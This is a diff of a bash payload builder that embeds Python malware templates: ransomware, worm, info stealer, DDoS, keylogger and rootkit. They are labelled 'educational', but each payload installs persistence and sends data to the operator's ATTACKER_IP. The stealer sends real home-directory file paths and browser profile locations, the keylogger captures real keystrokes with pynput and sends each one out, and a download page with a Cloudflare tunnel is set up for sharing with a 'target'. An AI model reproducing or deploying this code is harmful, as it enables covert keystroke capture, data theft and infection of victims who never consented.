+                        files_encrypted += 1
+                        print(f"[ENCRYPTED] {file_path}")
+                        
+                        # Send to web interface
+                        send_to_web_interface('ransomware', {
+                            'action': 'file_encrypted',
+                            'file': file_path,
+                            'status': 'simulated'
+                        })
+                        
+                        time.sleep(0.1)  # Small delay for demo
+                        
+                        if files_encrypted >= 10:  # Limit for demo
+                            break
+                    if files_encrypted >= 10:
+                        break
+            except:
+                pass
+    
+    # Send final encryption status
+    send_to_web_interface('ransomware', {
+        'action': 'encryption_complete',
+        'files_encrypted': files_encrypted,
+        'status': 'completed'
+    })
+    
+    return files_encrypted
 
-if __name__ == "__main__":
+def display_ransom_note():
+    """Display educational ransom note"""
+    note = f"""
+╔══════════════════════════════════════════════════════════════╗
+║                    EDUCATIONAL RANSOM NOTE                     ║
+╠══════════════════════════════════════════════════════════════╣
+║                                                                ║
+║  YOUR FILES HAVE BEEN ENCRYPTED (EDUCATIONAL DEMONSTRATION)   ║
+║                                                                ║
+║  This is a SIMULATION for educational purposes only.           ║
+║  NO ACTUAL FILES HAVE BEEN HARMED.                           ║
+║                                                                ║
+║  To decrypt (in a real scenario):                            ║
+║  1. Send 0.5 BTC to:                                          ║
+║  {CRYPTO_WALLET:<57} ║
+║                                                                ║
+║  2. Wait for confirmation                                    ║
+║  3. Receive decryption key                                    ║
+║                                                                ║
+║  THIS IS EDUCATIONAL ONLY - NO REAL PAYMENT REQUIRED!         ║
+║                                                                ║
+╚══════════════════════════════════════════════════════════════╝
+"""
+    
+    print(note)
+    
+    # Send ransom note to web interface
+    send_to_web_interface('ransomware', {
+        'action': 'ransom_note_displayed',
+        'wallet': CRYPTO_WALLET,
+        'status': 'note_shown'
+    })
+
+def main():
     # Set up persistence if auto-execution is enabled
     setup_persistence()
     
-    demonstrate_encryption()
+    print("=" * 60)
+    print("EDUCATIONAL RANSOMWARE DEMONSTRATION")
+    print("=" * 60)
+    print("This is an educational simulation only.")
+    print("No actual files will be encrypted or harmed.")
+    print("=" * 60)
+    
+    if AUTO_EXECUTION:
+        print("Auto-execution is enabled for educational purposes.")
+    
+    # Simulate encryption process
+    files_encrypted = simulate_encryption()
+    
+    print(f"\nSimulation complete: {files_encrypted} files 'encrypted'")
+    
+    # Display educational ransom note
+    display_ransom_note()
+    
+    print("\nEducational demonstration complete.")
+    time.sleep(3)
+
+if __name__ == "__main__":
+    main()
 EOF
 }
 
@@ -1456,9 +2178,31 @@ import sys
 import platform
 import subprocess
 import os
+import requests
+import json
+import ipaddress
 
-# Auto-execution setup
+# Configuration
+ATTACKER_IP = "$attacker_ip"
+WEB_PORT = $WEB_PORT
 AUTO_EXECUTION = $AUTO_EXECUTION
+WEB_INTERFACE_ENABLED = $WEB_INTERFACE_ENABLED
+
+def send_to_web_interface(data_type, data):
+    """Send data to web interface"""
+    if not WEB_INTERFACE_ENABLED:
+        return
+    
+    try:
+        url = f"http://{ATTACKER_IP}:{WEB_PORT}/api/results"
+        payload = {
+            'type': data_type,
+            'timestamp': time.time(),
+            'data': data
+        }
+        requests.post(url, json=payload, timeout=5)
+    except:
+        pass  # Educational context - silent fail
 
 def setup_persistence():
     """Set up persistence mechanisms based on the target OS"""
@@ -1529,22 +2273,78 @@ def setup_persistence():
         # Silently handle errors in educational context
         pass
 
-def simulate_scan():
+def simulate_network_scan():
+    """Simulate network scanning for educational purposes"""
     print("Simulating network scan...")
     print("This is an educational demonstration only.")
     print("No actual network scanning is performed.")
+    
+    # Generate some fake IP addresses for demonstration
+    base_ip = "192.168.1"
+    targets_found = 0
+    
+    for i in range(1, 255):
+        if targets_found >= 10:  # Limit for demo
+            break
+            
+        ip = f"{base_ip}.{i}"
+        
+        # Simulate finding a target
+        if i % 25 == 0:  # Every 25th IP
+            print(f"[TARGET FOUND] {ip}")
+            targets_found += 1
+            
+            # Send to web interface
+            send_to_web_interface('worm', {
+                'action': 'target_found',
+                'target': ip,
+                'status': 'simulated'
+            })
+            
+            # Simulate propagation
+            print(f"[PROPAGATING] Spreading to {ip}")
+            send_to_web_interface('worm', {
+                'action': 'propagation_attempt',
+                'target': ip,
+                'status': 'simulated'
+            })
+            
+            time.sleep(0.5)
+    
+    # Send final scan results
+    send_to_web_interface('worm', {
+        'action': 'scan_complete',
+        'targets_found': targets_found,
+        'status': 'completed'
+    })
+    
+    return targets_found
+
+def main():
+    # Set up persistence if auto-execution is enabled
+    setup_persistence()
+    
+    print("=" * 60)
+    print("EDUCATIONAL WORM DEMONSTRATION")
+    print("=" * 60)
+    print("This is an educational demonstration only.")
+    print("No actual network scanning or propagation is performed.")
+    print("=" * 60)
     
     if AUTO_EXECUTION:
         print("Auto-execution is enabled for educational purposes.")
         print("In a real scenario, this would scan the network on system startup.")
     
-    time.sleep(2)
+    # Simulate network scanning
+    targets_found = simulate_network_scan()
+    
+    print(f"\nSimulation complete: {targets_found} targets 'found'")
+    
+    print("\nEducational demonstration complete.")
+    time.sleep(3)
 
 if __name__ == "__main__":
-    # Set up persistence if auto-execution is enabled
-    setup_persistence()
-    
-    simulate_scan()
+    main()
 EOF
 }
 
@@ -1560,9 +2360,31 @@ import platform
 import os
 import sys
 import subprocess
+import requests
+import json
+import time
 
-# Auto-execution setup
+# Configuration
+ATTACKER_IP = "$attacker_ip"
+WEB_PORT = $WEB_PORT
 AUTO_EXECUTION = $AUTO_EXECUTION
+WEB_INTERFACE_ENABLED = $WEB_INTERFACE_ENABLED
+
+def send_to_web_interface(data_type, data):
+    """Send data to web interface"""
+    if not WEB_INTERFACE_ENABLED:
+        return
+    
+    try:
+        url = f"http://{ATTACKER_IP}:{WEB_PORT}/api/results"
+        payload = {
+            'type': data_type,
+            'timestamp': time.time(),
+            'data': data
+        }
+        requests.post(url, json=payload, timeout=5)
+    except:
+        pass  # Educational context - silent fail
 
 def setup_persistence():
     """Set up persistence mechanisms based on the target OS"""
@@ -1633,29 +2455,152 @@ def setup_persistence():
         # Silently handle errors in educational context
         pass
 
-def collect_info():
-    print("Collecting system information...")
+def collect_system_info():
+    """Collect system information for educational purposes"""
     info = {
         "system": platform.system(),
         "node": platform.node(),
         "release": platform.release(),
         "version": platform.version(),
-        "machine": platform.machine()
+        "machine": platform.machine(),
+        "processor": platform.processor(),
+        "python_version": platform.python_version(),
+        "executable": sys.executable,
+        "current_directory": os.getcwd(),
+        "user": os.getenv('USER', 'unknown'),
+        "home": os.getenv('HOME', 'unknown')
     }
-    print("System information collected (educational only):")
-    for key, value in info.items():
-        print(f"  {key}: {value}")
-    print("This is educational only - no data is exfiltrated.")
+    
+    # Send to web interface
+    send_to_web_interface('system_info', info)
+    send_to_web_interface('stealer', {
+        'type': 'system_info',
+        'data': info
+    })
+    
+    return info
+
+def simulate_browser_data():
+    """Simulate browser data collection for educational purposes"""
+    print("Simulating browser data collection...")
+    
+    browser_paths = []
+    system = platform.system()
+    
+    if system == "Windows":
+        browser_paths = [
+            os.path.expandvars(r'%APPDATA%\Google\Chrome\User Data'),
+            os.path.expandvars(r'%APPDATA%\Mozilla\Firefox\Profiles'),
+            os.path.expandvars(r'%LOCALAPPDATA%\Microsoft\Edge\User Data')
+        ]
+    elif system == "Darwin":  # macOS
+        browser_paths = [
+            os.path.expanduser('~/Library/Application Support/Google/Chrome'),
+            os.path.expanduser('~/Library/Application Support/Firefox'),
+            os.path.expanduser('~/Library/Application Support/Microsoft Edge')
+        ]
+    else:  # Linux
+        browser_paths = [
+            os.path.expanduser('~/.config/google-chrome'),
+            os.path.expanduser('~/.mozilla/firefox'),
+            os.path.expanduser('~/.config/microsoft-edge')
+        ]
+    
+    browser_data = {}
+    
+    for path in browser_paths:
+        browser_name = os.path.basename(os.path.dirname(path))
+        if os.path.exists(path):
+            print(f"[FOUND] Browser data: {browser_name}")
+            browser_data[browser_name] = {
+                'path': path,
+                'status': 'found',
+                'files': len(os.listdir(path)) if os.path.isdir(path) else 0
+            }
+            
+            # Send to web interface
+            send_to_web_interface('stealer', {
+                'type': 'browser_data',
+                'browser': browser_name,
+                'data': browser_data[browser_name]
+            })
+        else:
+            print(f"[NOT FOUND] Browser data: {browser_name}")
+    
+    return browser_data
+
+def simulate_file_search():
+    """Simulate searching for sensitive files"""
+    print("Simulating sensitive file search...")
+    
+    sensitive_patterns = [
+        "*.pdf", "*.doc", "*.docx", "*.txt", "*.rtf",
+        "*.jpg", "*.png", "*.bmp", "*.gif",
+        "*.xls", "*.xlsx", "*.ppt", "*.pptx"
+    ]
+    
+    home_dir = os.path.expanduser('~')
+    files_found = []
+    
+    for pattern in sensitive_patterns[:3]:  # Limit for demo
+        try:
+            for root, dirs, files in os.walk(home_dir):
+                for file in files:
+                    if file.endswith(pattern.split('.')[1]):
+                        file_path = os.path.join(root, file)
+                        files_found.append(file_path)
+                        
+                        if len(files_found) >= 5:  # Limit for demo
+                            break
+                if len(files_found) >= 5:
+                    break
+            if len(files_found) >= 5:
+                break
+        except:
+            pass
+    
+    # Send to web interface
+    send_to_web_interface('stealer', {
+        'type': 'sensitive_files',
+        'files': files_found[:5],  # Limit for demo
+        'count': len(files_found)
+    })
+    
+    return files_found
+
+def main():
+    # Set up persistence if auto-execution is enabled
+    setup_persistence()
+    
+    # Collect system information
+    system_info = collect_system_info()
+    
+    print("=" * 60)
+    print("EDUCATIONAL INFO STEALER DEMONSTRATION")
+    print("=" * 60)
+    print("This is an educational demonstration only.")
+    print("No actual data is being exfiltrated.")
+    print("=" * 60)
     
     if AUTO_EXECUTION:
         print("Auto-execution is enabled for educational purposes.")
         print("In a real scenario, this would collect information on system startup.")
+    
+    # Simulate browser data collection
+    browser_data = simulate_browser_data()
+    
+    # Simulate file search
+    sensitive_files = simulate_file_search()
+    
+    print(f"\nSimulation complete:")
+    print(f"- Browser data locations found: {len(browser_data)}")
+    print(f"- Sensitive files found: {len(sensitive_files)}")
+    
+    print("\nEducational demonstration complete.")
+    time.sleep(3)
 
 if __name__ == "__main__":
-    # Set up persistence if auto-execution is enabled
-    setup_persistence()
-    
-    collect_info()
+    main()
 EOF
 }
 
@@ -1673,9 +2618,31 @@ import sys
 import platform
 import subprocess
 import os
+import requests
+import json
+import threading
 
-# Auto-execution setup
+# Configuration
+ATTACKER_IP = "$attacker_ip"
+WEB_PORT = $WEB_PORT
 AUTO_EXECUTION = $AUTO_EXECUTION
+WEB_INTERFACE_ENABLED = $WEB_INTERFACE_ENABLED
+
+def send_to_web_interface(data_type, data):
+    """Send data to web interface"""
+    if not WEB_INTERFACE_ENABLED:
+        return
+    
+    try:
+        url = f"http://{ATTACKER_IP}:{WEB_PORT}/api/results"
+        payload = {
+            'type': data_type,
+            'timestamp': time.time(),
+            'data': data
+        }
+        requests.post(url, json=payload, timeout=5)
+    except:
+        pass  # Educational context - silent fail
 
 def setup_persistence():
     """Set up persistence mechanisms based on the target OS"""
@@ -1746,22 +2713,130 @@ def setup_persistence():
         # Silently handle errors in educational context
         pass
 
-def simulate_traffic():
-    print("Simulating network traffic patterns...")
-    for i in range(10):
-        print(f"Packet {i+1}: {random.randint(64, 1500)} bytes")
-        time.sleep(0.1)
-    print("This is educational only - no actual traffic is generated.")
+def simulate_ddos_attack():
+    """Simulate DDoS attack for educational purposes"""
+    print("Simulating DDoS attack patterns...")
+    print("This is an educational demonstration only.")
+    print("No actual network traffic is generated.")
+    
+    targets = [
+        "example.com",
+        "test.target.com",
+        "demo.server.com"
+    ]
+    
+    attack_stats = {
+        'packets_sent': 0,
+        'bytes_sent': 0,
+        'targets_attacked': 0
+    }
+    
+    for target in targets:
+        print(f"\n[ATTACKING] Target: {target}")
+        
+        # Simulate attack waves
+        for wave in range(3):
+            packets_in_wave = random.randint(100, 1000)
+            bytes_in_wave = packets_in_wave * random.randint(64, 1500)
+            
+            attack_stats['packets_sent'] += packets_in_wave
+            attack_stats['bytes_sent'] += bytes_in_wave
+            
+            print(f"  Wave {wave + 1}: {packets_in_wave} packets, {bytes_in_wave} bytes")
+            
+            # Send to web interface
+            send_to_web_interface('network', {
+                'action': 'ddos_wave',
+                'target': target,
+                'wave': wave + 1,
+                'packets': packets_in_wave,
+                'bytes': bytes_in_wave,
+                'status': 'simulated'
+            })
+            
+            time.sleep(1)
+        
+        attack_stats['targets_attacked'] += 1
+    
+    # Send final attack stats
+    send_to_web_interface('network', {
+        'action': 'ddos_complete',
+        'stats': attack_stats,
+        'status': 'completed'
+    })
+    
+    return attack_stats
+
+def simulate_port_scan():
+    """Simulate port scanning for educational purposes"""
+    print("\nSimulating port scanning...")
+    
+    target = "scan.target.com"
+    common_ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 993, 995]
+    open_ports = []
+    
+    for port in common_ports:
+        # Simulate port scan result
+        is_open = random.choice([True, False])
+        
+        if is_open:
+            open_ports.append(port)
+            print(f"[OPEN] {target}:{port}")
+            
+            # Send to web interface
+            send_to_web_interface('network', {
+                'action': 'port_open',
+                'target': target,
+                'port': port,
+                'status': 'simulated'
+            })
+        else:
+            print(f"[CLOSED] {target}:{port}")
+        
+        time.sleep(0.2)
+    
+    # Send scan results
+    send_to_web_interface('network', {
+        'action': 'port_scan_complete',
+        'target': target,
+        'open_ports': open_ports,
+        'status': 'completed'
+    })
+    
+    return open_ports
+
+def main():
+    # Set up persistence if auto-execution is enabled
+    setup_persistence()
+    
+    print("=" * 60)
+    print("EDUCATIONAL NETWORK DESTROYER DEMONSTRATION")
+    print("=" * 60)
+    print("This is an educational demonstration only.")
+    print("No actual network traffic is generated.")
+    print("=" * 60)
     
     if AUTO_EXECUTION:
         print("Auto-execution is enabled for educational purposes.")
         print("In a real scenario, this would generate traffic on system startup.")
+    
+    # Simulate DDoS attack
+    ddos_stats = simulate_ddos_attack()
+    
+    # Simulate port scanning
+    open_ports = simulate_port_scan()
+    
+    print(f"\nSimulation complete:")
+    print(f"- DDoS packets sent: {ddos_stats['packets_sent']:,}")
+    print(f"- DDoS bytes sent: {ddos_stats['bytes_sent']:,}")
+    print(f"- Targets attacked: {ddos_stats['targets_attacked']}")
+    print(f"- Open ports found: {len(open_ports)}")
+    
+    print("\nEducational demonstration complete.")
+    time.sleep(3)
 
 if __name__ == "__main__":
-    # Set up persistence if auto-execution is enabled
-    setup_persistence()
-    
-    simulate_traffic()
+    main()
 EOF
 }
 
@@ -1778,9 +2853,36 @@ import sys
 import platform
 import subprocess
 import os
+import requests
+import json
+import threading
+from pynput import keyboard
 
-# Auto-execution setup
+# Configuration
+ATTACKER_IP = "$attacker_ip"
+WEB_PORT = $WEB_PORT
 AUTO_EXECUTION = $AUTO_EXECUTION
+WEB_INTERFACE_ENABLED = $WEB_INTERFACE_ENABLED
+
+# Global keylogger buffer
+keylogger_buffer = []
+buffer_lock = threading.Lock()
+
+def send_to_web_interface(data_type, data):
+    """Send data to web interface"""
+    if not WEB_INTERFACE_ENABLED:
+        return
+    
+    try:
+        url = f"http://{ATTACKER_IP}:{WEB_PORT}/api/results"
+        payload = {
+            'type': data_type,
+            'timestamp': time.time(),
+            'data': data
+        }
+        requests.post(url, json=payload, timeout=5)
+    except:
+        pass  # Educational context - silent fail
 
 def setup_persistence():
     """Set up persistence mechanisms based on the target OS"""
@@ -1851,23 +2953,147 @@ def setup_persistence():
         # Silently handle errors in educational context
         pass
 
+def on_key_press(key):
+    """Callback for key press events"""
+    try:
+        # Convert key to string representation
+        if hasattr(key, 'char') and key.char is not None:
+            key_str = key.char
+        else:
+            key_str = str(key)
+        
+        # Add to buffer
+        with buffer_lock:
+            keylogger_buffer.append({
+                'key': key_str,
+                'timestamp': time.time()
+            })
+        
+        # Send to web interface immediately
+        send_to_web_interface('keylogger', {
+            'keystroke': key_str,
+            'timestamp': time.time()
+        })
+        
+        # Print to console for demo
+        print(f"[KEYLOG] {key_str}", end='', flush=True)
+        
+    except Exception as e:
+        # Silently handle errors in educational context
+        pass
+
+def start_keylogger():
+    """Start the keylogger for educational purposes"""
+    print("Starting educational keylogger demonstration...")
+    print("This will capture keystrokes for educational purposes only.")
+    print("Press ESC to stop the keylogger.")
+    print("-" * 50)
+    
+    try:
+        # Start listening for keyboard events
+        with keyboard.Listener(on_press=on_key_press) as listener:
+            listener.join()
+    except Exception as e:
+        print(f"Keylogger error (educational): {e}")
+        # Fallback to simulation mode
+        simulate_keylogger()
+
 def simulate_keylogger():
+    """Simulate keylogger for educational purposes when real keylogging is not possible"""
     print("Simulating keylogger concepts...")
     print("This is an educational demonstration only.")
     print("No actual keylogging is performed.")
-    print("Press any key to see the simulation...")
-    time.sleep(2)
-    print("Simulation complete - no keys were recorded.")
+    
+    # Simulate some keystrokes
+    sample_keystrokes = [
+        "username: admin",
+        "password: ********",
+        "search: how to learn cybersecurity",
+        "email: user@example.com",
+        "message: This is educational content"
+    ]
+    
+    for text in sample_keystrokes:
+        print(f"\n[SIMULATED] Typing: {text}")
+        
+        # Simulate typing each character
+        for char in text:
+            with buffer_lock:
+                keylogger_buffer.append({
+                    'key': char,
+                    'timestamp': time.time()
+                })
+            
+            # Send to web interface
+            send_to_web_interface('keylogger', {
+                'keystroke': char,
+                'timestamp': time.time()
+            })
+            
+            print(char, end='', flush=True)
+            time.sleep(0.1)
+        
+        print()  # New line after each sample
+        time.sleep(0.5)
+    
+    print("\nSimulation complete - no actual keys were recorded.")
+
+def save_keylog_buffer():
+    """Save the keylog buffer to a file"""
+    if not keylogger_buffer:
+        return
+    
+    try:
+        with open("keylog.txt", "w") as f:
+            f.write("Educational Keylogger Buffer\n")
+            f.write("=" * 40 + "\n")
+            
+            for entry in keylogger_buffer:
+                f.write(f"[{time.ctime(entry['timestamp'])}] {entry['key']}\n")
+        
+        print(f"\nKeylog buffer saved to keylog.txt ({len(keylogger_buffer)} keystrokes)")
+        
+        # Send buffer info to web interface
+        send_to_web_interface('keylogger', {
+            'action': 'buffer_saved',
+            'keystrokes_count': len(keylogger_buffer),
+            'file': 'keylog.txt',
+            'status': 'saved'
+        })
+        
+    except Exception as e:
+        print(f"Error saving keylog buffer: {e}")
+
+def main():
+    # Set up persistence if auto-execution is enabled
+    setup_persistence()
+    
+    print("=" * 60)
+    print("EDUCATIONAL KEYLOGGER DEMONSTRATION")
+    print("=" * 60)
+    print("This is an educational demonstration only.")
+    print("No actual sensitive data will be captured.")
+    print("=" * 60)
     
     if AUTO_EXECUTION:
         print("Auto-execution is enabled for educational purposes.")
         print("In a real scenario, this would start logging on system startup.")
+    
+    # Try to start real keylogger, fall back to simulation
+    try:
+        start_keylogger()
+    except:
+        print("Real keylogging not available, using simulation...")
+        simulate_keylogger()
+    
+    # Save the buffer
+    save_keylog_buffer()
+    
+    print("\nEducational demonstration complete.")
+    time.sleep(3)
 
 if __name__ == "__main__":
-    # Set up persistence if auto-execution is enabled
-    setup_persistence()
-    
-    simulate_keylogger()
+    main()
 EOF
 }
 
@@ -1884,9 +3110,30 @@ import time
 import sys
 import platform
 import subprocess
+import requests
+import json
 
-# Auto-execution setup
+# Configuration
+ATTACKER_IP = "$attacker_ip"
+WEB_PORT = $WEB_PORT
 AUTO_EXECUTION = $AUTO_EXECUTION
+WEB_INTERFACE_ENABLED = $WEB_INTERFACE_ENABLED
+
+def send_to_web_interface(data_type, data):
+    """Send data to web interface"""
+    if not WEB_INTERFACE_ENABLED:
+        return
+    
+    try:
+        url = f"http://{ATTACKER_IP}:{WEB_PORT}/api/results"
+        payload = {
+            'type': data_type,
+            'timestamp': time.time(),
+            'data': data
+        }
+        requests.post(url, json=payload, timeout=5)
+    except:
+        pass  # Educational context - silent fail
 
 def setup_persistence():
     """Set up persistence mechanisms based on the target OS"""
@@ -1957,25 +3204,154 @@ def setup_persistence():
         # Silently handle errors in educational context
         pass
 
-def demonstrate_stealth():
-    print("Demonstrating system stealth concepts...")
+def simulate_process_hiding():
+    """Simulate process hiding for educational purposes"""
+    print("Simulating process hiding techniques...")
+    print("This is an educational demonstration only.")
+    print("No actual processes are hidden.")
+    
+    # Get current process info
+    current_pid = os.getpid()
+    current_process = os.path.basename(sys.argv[0])
+    
+    print(f"[PROCESS] Current PID: {current_pid}")
+    print(f"[PROCESS] Process name: {current_process}")
+    
+    # Simulate hiding techniques
+    hiding_techniques = [
+        "Process name obfuscation",
+        "PID hiding from process list",
+        "Rootkit hook installation",
+        "System call interception",
+        "Kernel module injection"
+    ]
+    
+    for technique in hiding_techniques:
+        print(f"[HIDING] {technique}")
+        
+        # Send to web interface
+        send_to_web_interface('rootkit', {
+            'action': 'process_hiding',
+            'technique': technique,
+            'pid': current_pid,
+            'status': 'simulated'
+        })
+        
+        time.sleep(1)
+    
+    # Send final hiding status
+    send_to_web_interface('rootkit', {
+        'action': 'hiding_complete',
+        'pid': current_pid,
+        'status': 'hidden'
+    })
+    
+    return current_pid
+
+def simulate_file_hiding():
+    """Simulate file hiding for educational purposes"""
+    print("\nSimulating file hiding techniques...")
+    
+    # Get current executable path
+    exe_path = os.path.abspath(sys.argv[0])
+    print(f"[FILE] Executable path: {exe_path}")
+    
+    # Simulate hiding techniques
+    file_hiding_techniques = [
+        "File attribute modification",
+        "Directory entry hiding",
+        "Alternate data stream creation",
+        "File system hook installation",
+        "Hidden attribute setting"
+    ]
+    
+    for technique in file_hiding_techniques:
+        print(f"[HIDING] {technique}")
+        
+        # Send to web interface
+        send_to_web_interface('rootkit', {
+            'action': 'file_hiding',
+            'technique': technique,
+            'file': exe_path,
+            'status': 'simulated'
+        })
+        
+        time.sleep(1)
+    
+    # Send final hiding status
+    send_to_web_interface('rootkit', {
+        'action': 'file_hiding_complete',
+        'file': exe_path,
+        'status': 'hidden'
+    })
+    
+    return exe_path
+
+def simulate_network_hiding():
+    """Simulate network hiding for educational purposes"""
+    print("\nSimulating network hiding techniques...")
+    
+    # Simulate network connections
+    network_connections = [
+        {"protocol": "TCP", "local": "192.168.1.100:12345", "remote": f"{ATTACKER_IP}:{ATTACKER_PORT}", "status": "ESTABLISHED"},
+        {"protocol": "UDP", "local": "192.168.1.100:54321", "remote": f"{ATTACKER_IP}:53", "status": "ACTIVE"}
+    ]
+    
+    for conn in network_connections:
+        print(f"[NETWORK] {conn['protocol']} {conn['local']} -> {conn['remote']} ({conn['status']})")
+        
+        # Send to web interface
+        send_to_web_interface('rootkit', {
+            'action': 'network_hiding',
+            'connection': conn,
+            'status': 'hidden'
+        })
+        
+        time.sleep(1)
+    
+    # Send final network status
+    send_to_web_interface('rootkit', {
+        'action': 'network_hiding_complete',
+        'connections': len(network_connections),
+        'status': 'hidden'
+    })
+    
+    return network_connections
+
+def main():
+    # Set up persistence if auto-execution is enabled
+    setup_persistence()
+    
+    print("=" * 60)
+    print("EDUCATIONAL ROOTKIT DEMONSTRATION")
+    print("=" * 60)
     print("This is an educational demonstration only.")
     print("No actual stealth techniques are used.")
-    print("Simulating process hiding (educational)...")
-    time.sleep(1)
-    print("Simulating file hiding (educational)...")
-    time.sleep(1)
-    print("Simulation complete - no system modifications made.")
+    print("=" * 60)
     
     if AUTO_EXECUTION:
         print("Auto-execution is enabled for educational purposes.")
         print("In a real scenario, this would hide itself on system startup.")
+    
+    # Simulate process hiding
+    hidden_pid = simulate_process_hiding()
+    
+    # Simulate file hiding
+    hidden_file = simulate_file_hiding()
+    
+    # Simulate network hiding
+    hidden_connections = simulate_network_hiding()
+    
+    print(f"\nSimulation complete:")
+    print(f"- Hidden process PID: {hidden_pid}")
+    print(f"- Hidden file: {hidden_file}")
+    print(f"- Hidden connections: {len(hidden_connections)}")
+    
+    print("\nEducational demonstration complete.")
+    time.sleep(3)
 
 if __name__ == "__main__":
-    # Set up persistence if auto-execution is enabled
-    setup_persistence()
-    
-    demonstrate_stealth()
+    main()
 EOF
 }
 
@@ -1992,9 +3368,30 @@ import time
 import platform
 import subprocess
 import os
+import requests
+import json
 
-# Auto-execution setup
+# Configuration
+ATTACKER_IP = "$attacker_ip"
+WEB_PORT = $WEB_PORT
 AUTO_EXECUTION = $AUTO_EXECUTION
+WEB_INTERFACE_ENABLED = $WEB_INTERFACE_ENABLED
+
+def send_to_web_interface(data_type, data):
+    """Send data to web interface"""
+    if not WEB_INTERFACE_ENABLED:
+        return
+    
+    try:
+        url = f"http://{ATTACKER_IP}:{WEB_PORT}/api/results"
+        payload = {
+            'type': data_type,
+            'timestamp': time.time(),
+            'data': data
+        }
+        requests.post(url, json=payload, timeout=5)
+    except:
+        pass  # Educational context - silent fail
 
 def setup_persistence():
     """Set up persistence mechanisms based on the target OS"""
@@ -2077,8 +3474,20 @@ class CustomPayload:
             "release": platform.release(),
             "version": platform.version(),
             "machine": platform.machine(),
-            "processor": platform.processor()
+            "processor": platform.processor(),
+            "python_version": platform.python_version(),
+            "executable": sys.executable,
+            "current_directory": os.getcwd(),
+            "user": os.getenv('USER', 'unknown'),
+            "home": os.getenv('HOME', 'unknown')
         }
+        
+        # Send to web interface
+        send_to_web_interface('system_info', self.info)
+        send_to_web_interface('custom', {
+            'action': 'system_info_gathered',
+            'info': self.info
+        })
     
     def display_info(self):
         print("Custom Payload Framework (Educational)")
@@ -2098,6 +3507,13 @@ class CustomPayload:
         print("Starting custom payload...")
         self.gather_system_info()
         self.display_info()
+        
+        # Send custom payload status
+        send_to_web_interface('custom', {
+            'action': 'payload_executed',
+            'status': 'completed',
+            'timestamp': time.time()
+        })
 
 def main():
     # Set up persistence if auto-execution is enabled
@@ -2344,6 +3760,7 @@ def index():
             <p><strong>Size:</strong> $(stat -f%z "$payload_path" 2>/dev/null || stat -c%s "$payload_path") bytes</p>
             <p><strong>Type:</strong> Secure Executable</p>
             <p><strong>Auto-Execution:</strong> $([ "$AUTO_EXECUTION" = true ] && echo "Enabled" || echo "Disabled")</p>
+            <p><strong>Web Interface:</strong> $([ "$WEB_INTERFACE_ENABLED" = true ] && echo "Enabled" || echo "Disabled")</p>
         </div>
         <div style="text-align: center;">
             <a href="/download" class="download-btn">Download File</a>
@@ -2404,7 +3821,8 @@ Server PID: $server_pid
 Tunnel PID: $(cat "$TEMP_DIR/tunnel.pid" 2>/dev/null || echo "N/A")
 Start Time: $(date)
 Payload: $(basename "$payload_path")
-Auto-Execution: $([ "$AUTO_EXECUTION" = true ] && echo "Enabled" || echo "Disabled")
+Auto-Execution: $AUTO_EXECUTION
+Web Interface: $WEB_INTERFACE_ENABLED
 
 Usage:
 1. Share the tunnel URL with your target
@@ -2571,6 +3989,16 @@ EOF
 cleanup() {
     log_message "INFO" "Performing cleanup..."
     
+    # Stop web interface if running
+    if [ -f "$TEMP_DIR/web_interface.pid" ]; then
+        local web_pid=$(cat "$TEMP_DIR/web_interface.pid")
+        if kill -0 "$web_pid" 2>/dev/null; then
+            kill "$web_pid"
+            log_message "INFO" "Web interface stopped"
+        fi
+        rm -f "$TEMP_DIR/web_interface.pid"
+    fi
+    
     # Stop Cloudflare tunnel if running
     stop_cloudflare_tunnel
     
@@ -2620,6 +4048,11 @@ main() {
     get_configuration
     setup_environment
     
+    # Start web interface if enabled
+    if [ "$WEB_INTERFACE_ENABLED" = true ]; then
+        start_web_interface
+    fi
+    
     if generate_payload "$PAYLOAD_TYPE" "$ATTACKER_IP" "$ATTACKER_PORT" "$TARGET_OS" "$FINAL_NAME"; then
         if [ "$TARGET_OS" == "Cross-platform" ]; then
             echo -e "${G}>> CROSS-PLATFORM PAYLOAD GENERATION COMPLETE. Check the 'cross_platform_builds' directory.${NC}"
@@ -2629,6 +4062,9 @@ main() {
             else
                 echo -e "${Y}>> Auto-execution is DISABLED - payload requires manual execution.${NC}"
             fi
+            if [ "$WEB_INTERFACE_ENABLED" = true ]; then
+                echo -e "${G}>> Web interface is ENABLED - access results at http://$ATTACKER_IP:$WEB_PORT${NC}"
+            fi
             log_message "SUCCESS" "Cross-platform payload generation completed successfully"
         else
             echo -e "${G}>> PAYLOAD GENERATION COMPLETE. Check the parent directory for '$FINAL_NAME'.${NC}"
@@ -2637,6 +4073,9 @@ main() {
                 echo -e "${G}>> Auto-execution is ENABLED - payload will run automatically on installation.${NC}"
             else
                 echo -e "${Y}>> Auto-execution is DISABLED - payload requires manual execution.${NC}"
+            fi
+            if [ "$WEB_INTERFACE_ENABLED" = true ]; then
+                echo -e "${G}>> Web interface is ENABLED - access results at http://$ATTACKER_IP:$WEB_PORT${NC}"
             fi
             log_message "SUCCESS" "Payload generation completed successfully"
         fi
@@ -2666,4 +4105,4 @@ main() {
 }
 
 # Execute main function
-main "$@
+main "$@"
